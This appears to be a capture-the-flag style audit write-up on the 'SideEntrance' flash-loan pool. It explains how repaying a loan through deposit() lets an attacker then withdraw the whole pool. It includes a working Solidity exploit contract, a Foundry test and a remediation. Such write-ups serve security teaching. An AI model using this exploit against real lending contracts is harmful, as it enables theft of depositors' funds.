# SideEntrance Audit Report

### [H-01] Flash loan design flaw allows complete pool draining via cross-function accounting manipulation

#### Severity

**High**

#### Affected Mechanism

The `SideEntranceLenderPool.flashLoan` function, which validates protocol solvency by comparing its native Ether balance before and after the callback execution without verifying the origin or context of the returned funds.

---

#### Vulnerability Details

The vulnerability stems from a fundamental design flaw in the pool's execution flow and internal state accounting. The contract relies strictly on the native balance of the address (`address(this).balance`) to verify loan repayment:

```
uint256 balanceBefore = address(this).balance;
require(balanceBefore >= amount, "Not enough ETH in pool");

IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

require(address(this).balance >= balanceBefore, "Flash loan not repaid");

```

Simultaneously, the protocol allows users to increase their internal accounting ledger via the `deposit()` function. During the execution of the `execute()` callback, an attacker can route the borrowed Ether directly back into the pool by calling `deposit{value: amount}()`.

Because the physical Ether is returned to the pool's address, the final validation `address(this).balance >= balanceBefore` passes successfully. However, the internal state mapping (`balances[attacker]`) is erroneously credited. This allows the attacker to legitimately drain the funds post-flashloan by invoking `withdraw()`.

---

#### Impact

**Total Loss of Funds.** An attacker can drain 100% of the Ether deposited by legitimate users, leaving the protocol entirely insolvent while the internal ledger continues to track non-existent liabilities.

---

#### Proof of Concept (PoC)

##### 1. Exploit Smart Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideEntranceExploit {
    ISideEntranceLenderPool public immutable pool;
    address public immutable recoveryAddress;

    constructor(address _pool, address _recoveryAddress) {
        pool = ISideEntranceLenderPool(_pool);
        recoveryAddress = _recoveryAddress;
    }

    function attack(uint256 amount) external {
        // Step 1: Trigger the flash loan for the entire pool balance
        pool.flashLoan(amount);
        
        // Step 3: Withdraw the Ether now credited to our deposit balance
        pool.withdraw();

        // Step 4: Transfer the drained funds to the recovery address
        uint256 balance = address(this).balance;
        (bool success, ) = recoveryAddress.call{value: balance}("");
        require(success, "Transfer failed");
    }

    function execute() external payable {
        // Step 2: Callback invoked by the pool; repay via deposit()
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}

```

##### 2. Foundry Test Execution

```solidity
function test_sideEntrance() public checkSolvedByPlayer {
    SideEntranceExploit exploit = new SideEntranceExploit(
        address(pool),
        recovery
    );
    
    exploit.attack(ETHER_IN_POOL);              
}

```

---

#### Remediation

##### Recommended Mitigation:

Implement strict reentrancy controls using OpenZeppelin's `ReentrancyGuard` to block cross-function interactions during an active flash loan execution.

```soldity 
contract SideEntranceLenderPool is ReentrancyGuard {
    // ... code
    
    function flashLoan(uint256 amount) external nonReentrant {
        uint256 balanceBefore = address(this).balance;
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
        require(address(this).balance >= balanceBefore, "Flash loan not repaid");
    }
    
    function deposit() external payable nonReentrant {
        balances[msg.sender] += msg.value;
    }
}

```
